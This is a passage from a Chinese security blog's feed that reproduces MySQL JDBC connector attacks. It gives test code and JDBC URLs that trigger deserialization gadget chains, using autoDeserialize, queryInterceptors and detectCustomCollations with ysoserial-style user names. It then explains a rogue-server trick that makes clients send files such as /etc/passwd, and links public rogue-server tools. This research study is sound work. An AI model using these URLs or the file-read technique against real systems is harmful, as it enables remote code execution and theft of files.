class="string">&quot;password&quot;</span>);</span><br><span class="line">    Statement stmt = connection.createStatement();</span><br><span class="line">    ResultSet rs = stmt.executeQuery(<span class="string">&quot;select 1;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.0.x:还没有ServerStatusDiffInterceptor这个东西┓( ´∀` )┏</span></span><br></pre></td></tr></table></figure><h4 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * detectCustomCollations触发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.29 测试通过</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_29TO5_1_40</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?useSSL=false&amp;autoDeserialize=true&amp;detectCustomCollations=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.28-5.1.19：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 测试通过</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_19TO5_1_28</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3306/?useSSL=false&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.18以下的5.1.x版本：不可用</span></span><br><span class="line"><span class="comment">// 5.0.x版本不可用</span></span><br></pre></td></tr></table></figure><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>知其然更需知其所以然，下面尝试反向复现是如何发现这两个利用链的</p><p>autoDeserialize是源头，从autoDeserialize参数开始分析</p><h4 id="1-autoDeserialize的调用情况"><a href="#1-autoDeserialize的调用情况" class="headerlink" title="1. autoDeserialize的调用情况"></a>1. autoDeserialize的调用情况</h4><p><img src="/images/pasted-126.png" alt="upload successful"></p><pre><code>可以看到，如果字段类型是Binary或者BLOB，会进行反序列化，其中-84、-19为0xaced，java反序列化标志。</code></pre><h4 id="2-反向追踪"><a href="#2-反向追踪" class="headerlink" title="2. 反向追踪"></a>2. 反向追踪</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ClientPreparedStatement.EmulatedPreparedStatementBindings</span><br><span class="line">    getObject(int)</span><br><span class="line">        2015 return this.bindingsAsRs.getObject(parameterIndex);</span><br><span class="line"></span><br><span class="line">DatabaseMetaData.ResultSetIterator</span><br><span class="line">    next()</span><br><span class="line">        146 return this.resultSet.getObject(this.colIndex).toString();</span><br><span class="line"></span><br><span class="line">ResultSetUtil</span><br><span class="line">    resultSetToMap(Map, ResultSet)</span><br><span class="line">        46 mappedValues.put(rs.getObject(1), rs.getObject(2));</span><br><span class="line">    resultSetToMap(Map, ResultSet, int, int)</span><br><span class="line">        53 mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line"></span><br><span class="line">UpdatableResultSet</span><br><span class="line">    syncUpdate()</span><br><span class="line">        1141 this.updater.setObject(i + 1, getObject(i + 1), fields[i].getMysqlType());</span><br></pre></td></tr></table></figure><ul><li><p>2.1. ClientPreparedStatement.EmulatedPreparedStatementBindings</p><p>  PreparedStatement是预编译，还是只能在client 通过主动调用getObject触发，对利用无效</p></li><li><p>2.2. UpdatableResultSet</p><p>  UpdatableResultSet为更新Result，未找到利用点</p></li></ul><h5 id="2-3-DatabaseMetaData-ResultSetIterator"><a href="#2-3-DatabaseMetaData-ResultSetIterator" class="headerlink" title="2.3. DatabaseMetaData.ResultSetIterator"></a>2.3. DatabaseMetaData.ResultSetIterator</h5><p>尝试了几个链，都不太实用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#setAutoCommit</span><br><span class="line">IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>失败，ResultSetIterator是protect类，无法通过Class.forName(className).newInstance()实例化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DatabaseMetaData#getTables&#x2F;getCloumns等</span><br><span class="line">DatabaseMetaData#getCatalogIterator</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>触发困难</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#prepareCall</span><br><span class="line">  CallableStatement#getInstance</span><br><span class="line">    CallableStatement#CallableStatement</span><br><span class="line">      CallableStatement#determineParameterTypes</span><br><span class="line">        DatabaseMetaData#getProcedureColumns</span><br><span class="line">          DatabaseMetaData#getProcedureOrFunctionColumns</span><br><span class="line">            DatabaseMetaData#getProceduresAndOrFunctions</span><br><span class="line">              DatabaseMetaData#getCatalogIterator</span><br><span class="line">                DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">                  DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>触发困难</p><h5 id="2-4-ResultSetUtil"><a href="#2-4-ResultSetUtil" class="headerlink" title="2.4. ResultSetUtil"></a>2.4. ResultSetUtil</h5><p>有利用点，反向追溯过程如下</p><h6 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h6><p>ResultSetUtil#resultSetToMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, java.sql.ResultSet rs, <span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">populateMapWithSessionStatusValues</span><span class="params">(Map&lt;String, String&gt; toPopulate)</span> </span>&#123;</span><br><span class="line">    java.sql.Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    java.sql.ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            toPopulate.clear();</span><br><span class="line"></span><br><span class="line">            stmt = <span class="keyword">this</span>.connection.createStatement();</span><br><span class="line">            rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br></pre></td></tr></table></figure><p>此处了执行sql:SHOW SESSION STATUS</p><ul><li>evil mysql server可控情况下，可以返回可控的sql结果，从而触发后续的反序列化</li><li>如何触发populateMapWithSessionStatusValues，继续跟踪</li></ul><p>发现ServerStatusDiffInterceptor#postProcess和#preProcess有两处调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ServerStatusDiffInterceptor</span><br><span class="line">    postProcess(Supplier&lt;String&gt;, Query, T, ServerSession)</span><br><span class="line">        69 populateMapWithSessionStatusValues(this.postExecuteValues);</span><br><span class="line">    preProcess(Supplier&lt;String&gt;, Query)</span><br><span class="line">        105 populateMapWithSessionStatusValues(this.preExecuteValues);</span><br></pre></td></tr></table></figure><p>到这里和结果已经很接近了</p><ol><li>假如了解jdbc mysql 的参数，知道有个参数queryInterceptors，那对应起来很快就知道答案了</li><li>但是我是不了解的，只能苦逼的继续跟踪了</li></ol><p>NoSubInterceptorWrapper#preProcess</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">preProcess</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.underlyingInterceptor.preProcess(sql, interceptedQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NativeProtocol#invokeQueryInterceptorsPre</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">                T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">sendQueryPacket</span><span class="params">(Query callingQuery, NativePacketPayload queryPacket, <span class="keyword">int</span> maxRows, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (<span class="keyword">this</span>.queryInterceptors != <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                T interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>NativeSession#execSQL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">execSQL</span><span class="params">(Query callingQuery, String query, <span class="keyword">int</span> maxRows, NativePacketPayload packet, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (packet == <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                String encoding = <span class="keyword">this</span>.characterEncoding.getValue();</span><br><span class="line">                <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                        <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                    <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ConnectionImpl#setAutoCommit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> autoCommitFlag)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">this</span>.session.execSQL(<span class="keyword">null</span>, autoCommitFlag ? <span class="string">&quot;SET autocommit=1&quot;</span> : <span class="string">&quot;SET autocommit=0&quot;</span>, -<span class="number">1</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">this</span>.nullStatementResultSetFactory,</span><br><span class="line">                            <span class="keyword">this</span>.database, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>抓包看过mysql协议的都清楚，login之后，client和server会沟通一些参数，其中就有autocommit，所以链路径上是没问题了，需要解决的是链上的诸多条件<br><img src="/images/pasted-127.png" alt="upload successful"></p><h6 id="queryInterceptors的初始化"><a href="#queryInterceptors的初始化" class="headerlink" title="queryInterceptors的初始化"></a>queryInterceptors的初始化</h6><p>其中重点是queryInterceptors取值问题，最开始出现在NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">    T previousResultSet = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, s = <span class="keyword">this</span>.queryInterceptors.size(); i &lt; s; i++) &#123;</span><br><span class="line">        QueryInterceptor interceptor = <span class="keyword">this</span>.queryInterceptors.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> executeTopLevelOnly = interceptor.executeTopLevelOnly();</span><br><span class="line">        <span class="keyword">boolean</span> shouldExecute = (executeTopLevelOnly &amp;&amp; (<span class="keyword">this</span>.statementExecutionDepth == <span class="number">1</span> || forceExecute)) || (!executeTopLevelOnly);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (shouldExecute) &#123;</span><br><span class="line">            T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>追溯发现</p><p>NativeProtocol#queryInterceptors<br>NativeSession#queryInterceptors<br>ConnectionImpl#queryInterceptors</p><p>最终定位是在initializeSafeQueryInterceptors进行的初始化</p><p>ConnectionImpl#initializeSafeQueryInterceptors</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeSafeQueryInterceptors</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.queryInterceptors = Util</span><br><span class="line">                .&lt;QueryInterceptor&gt; loadClasses(<span class="keyword">this</span>.propertySet.getStringProperty(PropertyKey.queryInterceptors).getStringValue(),</span><br><span class="line">                        <span class="string">&quot;MysqlIo.BadQueryInterceptor&quot;</span>, getExceptionInterceptor())</span><br><span class="line">                .stream().map(o -&gt; <span class="keyword">new</span> NoSubInterceptorWrapper(o.init(<span class="keyword">this</span>, <span class="keyword">this</span>.props, <span class="keyword">this</span>.session.getLog()))).collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而PropertyKey，可以通过jdbc url参数进行指定，问题解决。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节在老师傅们的文档基础上，手动复现了jdbc mysql connector 8.0.14 cc7的反序列化，以及不同版本在ServerStatusDiffInterceptor和detectCustomCollations 两种方式的反序列化复现，没有什么新的东西。</p><p>求渔得渔，后半部分试着反向去挖掘jdbc mysql反序列化的利用链，在8.0.14版本上发现了几个鸡肋的链，最终发现ServerStatusDiffInterceptor链，过程虽然稍长，不过也算是最大的收获。</p><p>老样子，抛几个问题</p><ol><li>在反向找链的时候，发现本地还有一些类调用了ResultSetUtil.getObject，会不会有新的利用链</li><li>Binary类型也有同样的问题，测试下？</li><li>目前看来autoDeserialize是强特征，好像没绕过这个特征姿势了</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://paper.seebug.org/1227/">MySQL JDBC 客户端反序列化漏洞（四哥）</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析（fnmsd@360）</a></li><li>[3] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC 反序列化分析（7tem7）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考【1】中四哥已经讲的很全面也很详细了，简单记录下复现过程吧&lt;/p&gt;
&lt;h2 id=&quot;MySQL-反序列化&quot;&gt;&lt;a href=&quot;#MySQL-反序列化&quot; class=&quot;headerlink&quot; title=&quot;MySQL 反序列化&quot;&gt;&lt;/a&gt;MySQL 反序列化&lt;/h2&gt;&lt;h3 id=&quot;autoDeserialize&quot;&gt;&lt;a href=&quot;#autoDeserialize&quot; class=&quot;headerlink&quot; title=&quot;autoDeserialize&quot;&gt;&lt;/a&gt;autoDeserialize&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-125.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;如解释，mysql client会自动反序列化server端传回的BLOB类型&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc 碎碎念一：MySQL Client文件读取</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
    <published>2021-04-20T03:20:00.000Z</published>
    <updated>2021-04-21T09:36:24.245Z</updated>
    
    <content type="html"><![CDATA[<p>之前Get了h2 initsql的骚姿势，于是想总结总结jdbc url可控情况下的利用方法，经典的场景就是jdbc mysql 文件读取和反序列化，正好前不久的Druid CVE-2021-26919的用的就是jdbc mysql反序列化漏洞，学习学习，居然踩一些坑，单独记录下来。</p><p>mysql client任意文件读取漏洞历史悠久，参考【6】中有提到早在13年就有提出，但是作为mysql 正常功能一直保留。直到19年blackhat 张杨和可奕 大佬发现反序列化的利用场景（参考【5】），相关研究达到小高潮，不过多赘述。</p><h2 id="MySQL-Client文件读取漏洞"><a href="#MySQL-Client文件读取漏洞" class="headerlink" title="MySQL Client文件读取漏洞"></a>MySQL Client文件读取漏洞</h2><h3 id="原理：load-local-data"><a href="#原理：load-local-data" class="headerlink" title="原理：load local data"></a>原理：load local data</h3><p>正常的load local data流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client：申请跑个sql，内容是&quot;load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;&quot;</span><br><span class="line">server：好的，（识别sql内容），那你把&#x2F;etc&#x2F;passwd文件读取传过来吧</span><br><span class="line">client：好的，（读取本地&#x2F;etc&#x2F;passwd），这是文件内容，请查收</span><br></pre></td></tr></table></figure><p>攻击流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client：申请跑个sql，内容是&quot;***&quot;（jdbc-mysql-connector默认认证登录完成之后，会有show variables&#x2F;select 参数等行为）</span><br><span class="line">server：好的，（不管sql内容），那你把&#x2F;etc&#x2F;passwd文件读取传过来吧</span><br><span class="line">client：好的，（读取本地&#x2F;etc&#x2F;passwd），这是文件内容，请查收</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="local-infile-amp-allowLoadLocalInfile"><a href="#local-infile-amp-allowLoadLocalInfile" class="headerlink" title="local-infile &amp; allowLoadLocalInfile"></a>local-infile &amp; allowLoadLocalInfile</h3><h4 id="local-infile"><a href="#local-infile" class="headerlink" title="local-infile"></a>local-infile</h4><p>mysql server 有个配置参数，在my.cnf中对应的是</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>也可以在sql中通过全局参数local_infile实现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> local_infile = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p><strong>* 但是这并没有什么卵用 *</strong></p><p>需要关注的是mysql-client的参数，可以通过配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>或者在msyql命令行，显式加上 –local-infile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql --local-infile 1 -hlocalhost -uroot -ppassword</span><br></pre></td></tr></table></figure><h4 id="allowLoadLocalInfile"><a href="#allowLoadLocalInfile" class="headerlink" title="allowLoadLocalInfile"></a>allowLoadLocalInfile</h4><p>在jdbc-mysql-connector sdk中，控制client是否可以load local file的就是这个参数，在5.x和8.x中默认都是false（参考【7】和【8】），所以需要在jdbc url中配置allowLoadLocalInfile=true</p><p>在8.0.22中还引入了allowLoadLocalInfileInPath，不过没什么影响</p><p><img src="/images/pasted-121.png" alt="upload successful"></p><h3 id="max-allowed-packet"><a href="#max-allowed-packet" class="headerlink" title="max_allowed_packet"></a>max_allowed_packet</h3><blockquote><p>参考【1】中提到 jdbc-mysql-connector 5.x版本中，遇到max_allowed_packet 的问题，最终排查发现是client sdk中的maxAllowedPacket参数，需要server端下发配置。<br>作者采取的action是回复了client 的show varialbes请求，并在其中设置相关maxAllowedPacket等参数。</p></blockquote><p>其实在5.x中，maxAllowPacket default -1<br><img src="/images/pasted-122.png" alt="upload successful"><br>在8.*中，maxAllowPacket default 65535<br><img src="/images/pasted-123.png" alt="upload successful"></p><p>所以这也是jdbc-mysql-connector 5.*版本中需要注意的一个问题，需要显式的在url中加入参数maxAllowedPacket=65535.</p><h3 id="poc构造流程"><a href="#poc构造流程" class="headerlink" title="poc构造流程"></a>poc构造流程</h3><p>前文 load local data流程中，重点是第二个，也就是server的回包，需要指定client去读取特定文件，在不是很了解mysql协议情况下，改改包最简单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8.*</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=65535&quot;</span>;</span><br><span class="line">Connection conn = DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line">String sql = <span class="string">&quot;load data local infile \&quot;/etc/passwd\&quot; into table test FIELDS TERMINATED BY &#x27;\\n&#x27;;&quot;</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-124.png" alt="upload successful"></p><p>server 的整个攻击步骤如下:</p><ol><li>回复mysql client一个greeting包</li><li>等待client端发送一个查询包</li><li>回复一个file transfer包</li></ol><p>这里直接给通用的利用工具</p><ol><li><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a></p><p> 最早的利用工具，三个步骤，通过mysql组包实现。但是没复现成功…估计是mysql协议那里组包有问题，偷懒不详细分析了</p></li><li><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p> fnmsd的，要多看他写的文档，通过username指定读取的文件</p></li><li><p><a href="https://github.com/yang8e/jdbc_mysql_redfile">https://github.com/yang8e/jdbc_mysql_redfile</a></p><p> yang8e的，直接发包，没关注mysql协议细节，粗暴但是也简单。当时也踩了他这个坑，不过有更通用的jdbc poc url。</p></li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本以为一篇文章可以搞定，结果行文还是过长，反序列化的下篇再做研究吧。</p><p>简单总结下，本文研究了jdbc-mysql-connector的mysql client任意文件读取漏洞，结论是无论是5.*、8.*都受影响。期间踩了jdbc 5.*版本maxAllowedPacket的坑，发现了yang8e的解决方案，并提出更通用的poc。</p><p>抛出个问题:</p><ol><li>如何禁用jdbc client的load local file功能？阉割sdk？还是allowLoadLocalInfile=false</li><li>目前的poc只能读取一个文件client就会抛异常，有办法可以持续读取多个文件吗？</li></ol><h2 